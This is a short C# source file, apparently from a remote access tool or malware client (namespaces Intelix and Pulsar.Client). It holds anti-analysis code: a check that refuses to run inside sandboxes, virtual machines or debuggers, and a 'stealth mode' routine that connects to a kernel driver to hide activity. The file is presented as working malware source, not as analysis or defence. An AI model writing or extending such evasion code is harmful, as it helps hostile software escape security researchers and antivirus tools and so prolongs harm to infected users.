using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Intelix.AntiAnalysis
{
    public static class AdvancedChecks
    {
        // FIXED: Removed dependency on non-existent shadow_core.dll
        // Now uses local C# AntiSandbox module instead

        /// <summary>
        /// Check if environment is safe to run (not a sandbox/VM/debugger)
        /// </summary>
        public static bool IsSafeEnvironment()
        {
            try
            {
                // Use the new comprehensive AntiSandbox module
                return Pulsar.Client.Modules.AntiSandbox.IsSafeEnvironment();
            }
            catch (Exception)
            {
                // Fallback to basic checks if AntiSandbox not available
                try
                {
                    return !Intelix.Helper.AntiVirtual.ProccessorCheck() &&
                           !Intelix.Helper.AntiVirtual.CheckDebugger() &&
                           !Intelix.Helper.AntiVirtual.CheckMemory();
                }
                catch
                {
                    return false;
                }
            }
        }

        /// <summary>
        /// Activate stealth mode (connect to kernel driver if available)
        /// </summary>
        public static void ActivateStealthMode()
        {
            try
            {
                // Try to connect to Shadow kernel driver
                using (var kernel = new Pulsar.Plugins.Client.Modules.KernelController())
                {
                    if (kernel.Connect())
                    {
                        // Kernel driver available - stealth mode activated
                        return;
                    }
                }
            }
            catch { /* Silent fail - kernel not available */ }
        }
    }
}
